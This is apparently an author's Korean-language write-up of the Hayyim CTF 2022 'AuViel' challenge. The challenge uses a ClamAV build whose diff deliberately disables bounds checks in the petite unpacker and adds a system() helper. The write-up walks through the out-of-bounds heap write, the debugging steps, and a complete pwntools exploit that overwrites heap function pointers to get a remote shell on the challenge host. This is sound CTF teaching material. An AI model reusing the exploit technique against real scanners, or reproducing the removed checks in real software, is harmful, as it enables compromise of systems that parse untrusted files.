---
layout: post
title: Hayyim CTF 2022 AuViel write-up
categories: ctf-write-up
tag: [ctf]
---

## AuViel (1 solves)

![image](https://user-images.githubusercontent.com/43925259/154009943-cdd283d8-a909-4f6e-8e82-5a47540fdbe9.png)



이 문제는 real world에서 안티바이러스를 분석해보다가 아이디어가 떠올라서 만든 문제이다. 최대한 많은 사람들이 풀었으면 하는 마음에 리눅스에서 문제를 냈고, 최대한 쉽게 풀릴 수 있도록 난이도를 낮추며 노력을 했다. 따라서 실제로 안티바이러스를 분석했을 때와 비교했을 때 많은 과정이 생략되었고 단순히 oob를 찾고 vtable을 덮으면 끝나는 문제로 만들게 되었다. 하지만 안티바이러스라는 이유로 대부분의 사람들은 이 문제를 제일 마지막에 시도한 거 같고 결국 한 팀밖에 풀지 못했다.



ptr-yudai의 write-up은 여기에 있다. (https://ptr-yudai.hatenablog.com/entry/2022/02/13/122744)



주어진 diff 파일은 다음과 같다.

```diff
--- clamav/clamscan/clamscan.c   2022-01-11 09:35:04.000000000 +0900
+++ clamav-ctf/clamscan/clamscan.c   2022-01-25 17:32:18.347993027 +0900
@@ -60,6 +60,10 @@
 short recursion = 0, bell = 0;
 short printinfected = 0, printclean = 1;
 
+void gift(void) {
+    system("Hayyim CTF 2022\n");
+}
+
 int main(int argc, char **argv)
 {
     int ds, dms, ret;
diff -ru clamav/libclamav/petite.c clamav-ctf/libclamav/petite.c
--- clamav/libclamav/petite.c   2022-01-11 09:35:04.000000000 +0900
+++ clamav-ctf/libclamav/petite.c   2022-01-25 17:33:58.605682430 +0900
@@ -328,8 +328,8 @@
              */
 
             for (q = 0; q < sectcount; q++) {
-                if (!CLI_ISCONTAINED(sections[q].rva, sections[q].vsz, usects[j].rva, usects[j].vsz))
-                    continue;
+                /*if (!CLI_ISCONTAINED(sections[q].rva, sections[q].vsz, usects[j].rva, usects[j].vsz))
+                    continue;*/
                 if (!check4resources) {
                     usects[j].rva = sections[q].rva;
                     usects[j].rsz = thisrva - sections[q].rva + size;
@@ -365,10 +365,10 @@
              * func to get called instead... ehehe very smart ;)
              */
 
-            if (!CLI_ISCONTAINED(buf, bufsz, ssrc, 1) || !CLI_ISCONTAINED(buf, bufsz, ddst, 1)) {
+            /*if (!CLI_ISCONTAINED(buf, bufsz, ssrc, 1) || !CLI_ISCONTAINED(buf, bufsz, ddst, 1)) {
                 free(usects);
                 return 1;
-            }
+            }*/
 
             size--;
             *ddst++   = *ssrc++; /* eheh u C gurus gotta luv these monsters :P */
@@ -383,10 +383,10 @@
                     return 1;
                 }
                 if (!oob) {
-                    if (!CLI_ISCONTAINED(buf, bufsz, ssrc, 1) || !CLI_ISCONTAINED(buf, bufsz, ddst, 1)) {
+                    /*if (!CLI_ISCONTAINED(buf, bufsz, ssrc, 1) || !CLI_ISCONTAINED(buf, bufsz, ddst, 1)) {
                         free(usects);
                         return 1;
-                    }
+                    }*/
                     *ddst++ = (char)((*ssrc++) ^ (size & 0xff));
                     size--;
                 } else {
```



익스플로잇을 쉽게 하기 위해서 gift 함수를 통해 system 함수를 넣어주었다. 그리고 petite.c에서 조건 검사를 3개정도를 삭제하였다. 따라서 삭제된 부분들 주변을 오디팅하면 버그를 찾을 수 있다.



`CLI_ISCONTAINED`는 other.h에 정의되어 있는데 다음과 같이 동작한다.

```c++
#define CLI_ISCONTAINED(bb, bb_size, sb, sb_size)                            \
    ((size_t)(bb_size) > 0 && (size_t)(sb_size) > 0 &&                       \
     (size_t)(sb_size) <= (size_t)(bb_size) &&                               \
     (size_t)(sb) >= (size_t)(bb) &&                                         \
     (size_t)(sb) + (size_t)(sb_size) <= (size_t)(bb) + (size_t)(bb_size) && \
     (size_t)(sb) + (size_t)(sb_size) > (size_t)(bb) &&                      \
     (size_t)(sb) < (size_t)(bb) + (size_t)(bb_size))
```



매크로의 이름을 보면 어떤 기능 기능을 하는지 쉽게 유추할 수 있다.

![image](https://user-images.githubusercontent.com/43925259/154014297-0f24c108-db0f-436a-a4ef-a5fbc698f5a6.png)

이 그림 처럼 sb가 bb의 영역을 벗어나는지 검사하는 코드이다. 이 검사가 사라졌기 때문에 3번째 인자인 ssrc와 ddst는 저 범위를 벗어날 수 있다는 점을 주목해야 한다.



취약한 부분은 다음과 같다.

```c
[1] ssrc = adjbuf + srva;
[2] ddst = adjbuf + thisrva;

...

/*if (!CLI_ISCONTAINED(buf, bufsz, ssrc, 1) || !CLI_ISCONTAINED(buf, bufsz, ddst, 1)) {
    free(usects);
    return 1;
}*/

size--;
[3] *ddst++   = *ssrc++; /* eheh u C gurus gotta luv these monsters :P */
backbytes = 0;
oldback   = 0;

/* No surprises here... NRV any1??? ;) */
while (size > 0) {
    oob = doubledl(&ssrc, &mydl, buf, bufsz);
    if (oob == -1) {
        free(usects);
        return 1;
    }
    if (!oob) {
        /*if (!CLI_ISCONTAINED(buf, bufsz, ssrc, 1) || !CLI_ISCONTAINED(buf, bufsz, ddst, 1)) {
            free(usects);
            return 1;
        }*/
[4]     *ddst++ = (char)((*ssrc++) ^ (size & 0xff));
        size--;
    } else {
      	...
```

[3]에서 ddst에 접근하여 ssrc에 값을 넣는다. 그리고 [4]에서 ddst에 ssrc의 값과 size 값으로 xor된 값을 넣고 이를 반복한다.

ddst를 조작할 수 있고 ssrc에 컨트롤 가능한 데이터가 포함된다면 oob write 취약점이 발생하게 된다.



[1]과 [2]에서 ssrc와 ddst의 값이 결정되므로 이 부분을 ida에서 찾아서 브레이크 포인트를 설정한 뒤 디버깅해보면 된다.



우선 디버깅을 위하여 테스트 파일을 생성해야한다.

```c
#include <stdio.h>

int main(void) {
	printf("hello world!\n");
	return 0;
}
```

이렇게 코드를 작성한 뒤 32bit로 컴파일 하여 petite packer를 사용하면 6407바이트가 된다.



ida를 통해서 보면 이 부분에서 ssrc와 ddst를 설정하는 것을 알 수 있다. 따라서 0x107efb에 브레이크 포인트를 설정하여 디버깅하면 된다.

![image](https://user-images.githubusercontent.com/43925259/154028400-36c0eb60-64a4-44ef-9e84-9cfc21cde692.png)

ssrc는 r8 + rdi로 구성되고 이때 주소를 확인해보면 다음과 같다.

```
pwndbg> x/10gx 0x2397032
0x2397032:	0x6175747269560000	0x746365746f72506c
0x2397042:	0x7472695600000000	0x636f6c6c416c6175
0x2397052:	0x7472695600000000	0x00656572466c6175
0x2397062:	0x694c64616f4c0000	0x0000417972617262
0x2397072:	0x7465736d656d0000	0x7465735f00000000
```



이를 hxd에서 검색해보면 이부분임을 알 수 있다.

![image](https://user-images.githubusercontent.com/43925259/154023043-4d487a0c-26a5-43e2-b34e-62c1568cfc79.png)



나중에 이 부분을 참조해서 xor 한 뒤 값을 삽입하기 때문에 이부분에 [원하는 데이터] ^ [size & ff] 한 값을 넣어주면 된다.



ddst의 경우 다음과 같이 구성된다.

![image](https://user-images.githubusercontent.com/43925259/154023623-2be3f240-b196-40b6-89a1-bcc3c13f40da.png)

rdi는 힙주소이며 rax를 더해서 만들고 있는데 0x6074를 수정할 수 있다면 oob 버그를 트리거할 수 있다. 마찬가지로 저 부분이 바이너리 내에 존재하는지 검색해보면 된다. 그러면 다음과 같이 딱 한 곳에서 검색이 된다.

![image](https://user-images.githubusercontent.com/43925259/154023932-ad51afc2-eb73-439c-913d-86a274ce4c9f.png)

이를 통하여 rdi 레지스터에 적힌 힙을 기준으로 원하는 offset에 원하는 데이터를 넣을 수 있게 된다.



주로 CTF에서의 heap 익스플로잇은 해제되어 있는 heap을 사용하는 경우가 많다. 하지만 이 방법은 리얼월드에서 사용하기 쉽지 않다. 제일 무난한 방법은 현재 할당되어 있는 힙들을 찾고 그 중 함수 포인터가 존재하는 지 보는 것이다.



pwndbg의 heap 커맨드를 사용해보면 할당되어 있는 힙을 볼 수 있다.

![image](https://user-images.githubusercontent.com/43925259/154027435-2fa5bc40-3d47-409d-9acd-ce94ff30fc55.png)

이렇게 할당되어 있는 힙들을 몇개 보다보면 함수 포인터가 여러개 보인다.

![image](https://user-images.githubusercontent.com/43925259/154182900-dcd52736-90c9-42f4-a234-12de07bac7d2.png)

다음과 같이 cli_pcre_malloc, cli_pcre_free와 같은 이름의 함수가 힙의 여러곳에 할당된 채로 존재한다. 이 포인터를 임의 값으로 바꾸고 프로그램을 실행해보면 다음과 같이 동작한다.

![image](https://user-images.githubusercontent.com/43925259/154028251-867d799e-4c16-4eca-863d-5ee4e606c348.png)

즉 cli_pcre_malloc 부분에 /bin/sh 문자열을, cli_pcre_free 부분에 system@plt를 삽입하면 셸을 얻을 수 있다.



������ 하지만 문제점은 도커 내부에서 실행시킬 때와 xinetd로 프로그램을 실행할 때 힙 레이아웃이 조금씩 변하기 때문에 정확한 offset을 구하기 위해선 주어진 start.sh를 실행하여 xinetd로 프로그램을 실행시킨 뒤 attach하여 디버깅을 해야 remote 익스플로잇을 한 번에 성공시킬 수 있다.



수 많은 함수 포인터 중 하나는 탑 청크와 바로 위에 위치해서 이를 사용하기로 했다. ddst를 연산하는 `libclamav.so.9_base + 0x107efe`에 브레이크 포인트를 설정하고 그때 힙 주소와 탑 청크 바로 위의 함수 포인터의 거리를 계산해주면 된다.



다음과 같은 코드를 작성했다.

```python
from pwn import *

p = remote("localhost", 10000)

data = open("exp.exe").read()

original_offset = '\x74\x60\x00\x00'
binsh_offset = p32(0x180d0)

payload = ''
payload += data.replace(original_offset, binsh_offset)

p.sendlineafter(': ', '1')
p.sendlineafter(': ', str(len(payload)))
p.sendlineafter(': ', payload)
p.interactive()
```



디버깅을 통해 binsh가 위치할 부분과 현재 힙 거리를 연산하여 넣어주었다. 이제 값을 1byte씩 삽입할텐데 몇글자나 삽입 가능한지 보기 위하여 테스트했다.

```
pwndbg> x/2gx 0x30150b0
0x30150b0:	0x00007fb035c9c8f0	0x00007fb035c9c900

pwndbg> continue

pwndbg> x/2gx 0x30150b0
0x30150b0:	0x313f2a14130b3500	0x00007fb035c9340c
```



총 10byte가 순차적으로 입력되었다. 파일 하나로 익스플로잇을 하는 방법도 있지만 파일 2개를 가지고 하나는 /bin/sh, 또 하나는 system@plt를 쓰는것이 편할 것이다. 파일을 2개를 넣었을 때의 offset을 확인 한 뒤 xor에 주의하여 익스플로잇을 완성하면 된다.



익스플로잇 코드는 다음과 같다.

```python
from pwn import *

def encode(data):
    result = ''
    size = 0x63
    data = data.ljust(10, '\x00')

    for i in range(10):
        result += chr(ord(data[i]) ^ size)
        size -= 1

    return result
    
#p = remote("localhost", 10000)
p = remote("141.164.48.191", 10000)
e = ELF('./clamscan')

data = open("exp.exe").read()

original_offset = '\x74\x60\x00\x00'
original_ssrc = "VirtualPro"
binsh_offset = p32(0x180d0-1)
system_offset = p32(0x7c318-1)

payload = data.replace(original_offset, binsh_offset)
payload = payload.replace(original_ssrc, encode('/bin/sh'))

payload2 = data.replace(original_offset, system_offset)
payload2 = payload2.replace(original_ssrc, encode(p64(e.sym['system'])))

p.sendlineafter(': ', '2')
p.sendlineafter(': ', str(len(payload)))
p.sendafter(': ', payload)
p.sendlineafter(': ', str(len(payload2)))
p.sendafter(': ', payload2)

p.interactive()
```


